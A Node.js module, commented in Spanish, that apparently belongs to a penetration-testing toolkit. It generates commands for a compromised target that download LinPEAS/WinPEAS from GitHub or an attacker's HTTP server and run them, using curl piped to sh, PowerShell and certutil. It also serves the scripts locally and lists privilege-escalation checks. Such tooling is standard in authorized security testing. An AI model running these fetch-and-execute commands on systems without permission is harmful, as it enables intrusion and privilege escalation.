const { spawn, execSync } = require('child_process');
const https = require('https');
const http  = require('http');

// URLs oficiales PEASS-ng (GitHub releases)
const URLS = {
    winpeas_exe:  'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe',
    winpeas_bat:  'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat',
    linpeas_sh:   'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh',
    linpeas_slim: 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas_small.sh',
};

/**
 * Genera comandos listos para ejecutar en la máquina comprometida.
 * @param {string} os    - 'linux' | 'windows'
 * @param {string} lhost - IP del atacante (para descargar el script)
 * @param {object} options
 * @returns {Array<{label, command}>}
 */
function generateCommands(os, lhost, options = {}) {
    const port = options.port || 8000;
    if (os === 'linux') {
        return [
            { label: 'Descarga + Ejecuta (curl)',
              command: `curl -L ${URLS.linpeas_sh} | sh` },
            { label: 'Descarga + Ejecuta (wget)',
              command: `wget -qO- ${URLS.linpeas_sh} | sh` },
            { label: 'Desde tu servidor HTTP (${lhost}:${port})',
              command: `curl http://${lhost}:${port}/linpeas.sh | sh` },
            { label: 'Guardar y ejecutar',
              command: `curl -L ${URLS.linpeas_sh} -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh` },
            { label: 'LinPEAS → output file',
              command: `curl -L ${URLS.linpeas_sh} | sh 2>&1 | tee /tmp/linpeas_output.txt` },
            { label: 'Slim version (más pequeña)',
              command: `curl -L ${URLS.linpeas_slim} | sh` },
        ];
    } else {
        return [
            { label: 'PowerShell — Descarga + Ejecuta (WinPEAS)',
              command: `Invoke-WebRequest -Uri "${URLS.winpeas_exe}" -OutFile "C:\\Windows\\Temp\\winpeas.exe"; C:\\Windows\\Temp\\winpeas.exe` },
            { label: 'PowerShell — WinPEAS .bat',
              command: `Invoke-WebRequest -Uri "${URLS.winpeas_bat}" -OutFile "C:\\Windows\\Temp\\wp.bat"; cmd.exe /c C:\\Windows\\Temp\\wp.bat` },
            { label: 'PowerShell — desde tu servidor HTTP',
              command: `Invoke-WebRequest -Uri "http://${lhost}:${port}/winPEASx64.exe" -OutFile "C:\\Windows\\Temp\\wp.exe"; C:\\Windows\\Temp\\wp.exe` },
            { label: 'cmd.exe — certutil descarga',
              command: `certutil.exe -urlcache -f "${URLS.winpeas_exe}" C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe` },
            { label: 'WinPEAS → output file',
              command: `Invoke-WebRequest -Uri "${URLS.winpeas_exe}" -OutFile "$env:TEMP\\wp.exe"; Start-Process -FilePath "$env:TEMP\\wp.exe" -ArgumentList "notcolor" -RedirectStandardOutput "$env:TEMP\\winpeas_out.txt" -Wait` },
        ];
    }
}

/**
 * Sirve el script PEASS localmente (levanta HTTP temporal).
 * El usuario puede apuntar el target a http://LHOST:PORT/linpeas.sh
 */
function serveScript(os, port, onLine, onDone) {
    const scriptUrl = os === 'linux' ? URLS.linpeas_sh : URLS.winpeas_bat;
    const filename  = os === 'linux' ? 'linpeas.sh' : 'winpeas.bat';
    onLine(`[INFO] Descargando ${filename} para servirlo localmente...`);

    // Usar Python para servir un directorio temporal
    const args = ['-m', 'http.server', String(port || 8000), '--bind', '0.0.0.0'];
    const cwd  = '/tmp';
    onLine(`$ python3 ${args.join(' ')}  (CWD: ${cwd})`);
    onLine(`[INFO] Descarga antes: wget ${scriptUrl} -O /tmp/${filename}`);
    onLine(`[INFO] Luego desde el target: curl http://LHOST:${port || 8000}/${filename} | sh`);

    const proc = spawn('python3', args, { shell: false, cwd });
    proc.stdout.on('data', d => d.toString().split('\n').forEach(l => l.trim() && onLine(l)));
    proc.stderr.on('data', d => d.toString().split('\n').forEach(l => l.trim() && onLine(l)));
    proc.on('close', code => { onLine(`[HTTP Server] Exit: ${code}`); onDone(code); });
    proc.on('error', err => { onLine(`[ERROR] ${err.message}`); onDone(1); });
    return proc;
}

// Categorías de checks que realiza PEASS
const checkCategories = {
    linux: [
        'System Information (OS, kernel, sudo version)',
        'Sudo permissions y binarios SUID/GUID',
        'Capabilities (cap_setuid, cap_net_admin...)',
        'Cron jobs y scripts con permisos escribibles',
        'Contraseñas en historial bash, env vars, ficheros config',
        'Docker, LXC, Kubernetes breakout',
        'Network — interfaces, puertos locales, rutas',
        'Procesos corriendo como root',
        'NFS shares mal configurados',
        'SSH keys, authorized_keys',
        'Servicios systemd escribibles',
        'Passwords en bases de datos locales',
    ],
    windows: [
        'Sistema: OS, hotfixes, antivirus, UAC',
        'Usuarios y grupos locales/dominio',
        'Credentials Manager, DPAPI, Vault',
        'Servicios con permisos débiles (Unquoted Service Path)',
        'AlwaysInstallElevated, DLL Hijacking',
        'Scheduled Tasks escribibles',
        'Registry con permisos débiles (AutoRun keys)',
        'Contraseñas en archivos (web.config, unattend.xml...)',
        'Credenciales WiFi guardadas',
        'AppLocker, LAPS, GPP passwords',
        'Puertos locales y conexiones de red',
        'UAC bypass vectors',
    ],
};

module.exports = { generateCommands, serveScript, checkCategories, URLS };
